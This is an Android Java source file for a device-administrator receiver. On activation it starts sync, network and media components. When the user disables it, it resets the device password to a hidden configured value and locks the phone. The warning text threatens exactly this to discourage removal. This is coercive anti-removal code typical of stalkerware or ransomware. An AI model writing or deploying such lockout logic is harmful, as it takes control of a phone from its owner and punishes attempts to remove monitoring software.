package com.bob.deviceadm;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver
    extends DeviceAdminReceiver
{
    public AdminReceiver()
    {
    }

    @Override
    public void onEnabled( Context context, Intent intent )
    {
        super.onEnabled(context, intent);
        context.sendBroadcast(new Intent(context, NetworkReceiver.class));
        context.sendBroadcast(new Intent(context, MediaReceiver.class));
        SyncService.startSync(context);
    }

    @Override
    public CharSequence onDisableRequested( Context context, Intent intent )
    {
        return "You should never disable this, if you insist, your administrator will be notified and the phone will be locked.";
    }

    @Override
    public void onDisabled( Context context, Intent intent )
    {
        lockDeviceWithNewPassword(context);
    }

    private void lockDeviceWithNewPassword( Context context )
    {
        DevicePolicyManager devicePolicyManager = getManager(context);
        devicePolicyManager.resetPassword(Configuration.getConfiguration(context).lockPasword, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        devicePolicyManager.lockNow();
    }
}
